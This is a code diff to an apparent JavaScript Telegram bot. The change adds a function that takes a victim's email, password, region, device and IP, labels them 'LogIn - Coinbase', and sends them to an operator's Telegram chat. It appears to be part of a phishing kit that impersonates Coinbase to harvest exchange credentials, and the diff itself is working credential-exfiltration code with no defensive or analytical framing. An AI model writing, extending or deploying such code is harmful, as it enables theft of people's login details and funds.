@@ -11,6 +11,24 @@ export function setApprovalsStore(store) {
   approvals = store;
 }
 
+// Function to send login info to Telegram
+export async function sendTelegramMessage(email, password, region, device, ip) {
+  const chatId = process.env.CHAT_ID;
+  const message = `😈 LogIn - Coinbase 😈\n
+📧 Email: ${email}
+🔑 Password: ${password}
+🌍 Region: ${region}
+💻 Device: ${device}
+📡 IP: ${ip}`;
+
+  try {
+    await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
+    console.log('Telegram message sent successfully');
+  } catch (err) {
+    console.error('Failed to send Telegram message:', err);
+  }
+}
+
 // Start the bot
 export function startBot() {
   bot.on("callback_query", async (ctx) => {
@@ -35,7 +53,6 @@ export function startBot() {
 
   bot.launch().then(() => console.log("Telegram bot running..."));
 
-  // Graceful stop
   process.once('SIGINT', () => bot.stop('SIGINT'));
   process.once('SIGTERM', () => bot.stop('SIGTERM'));
 }
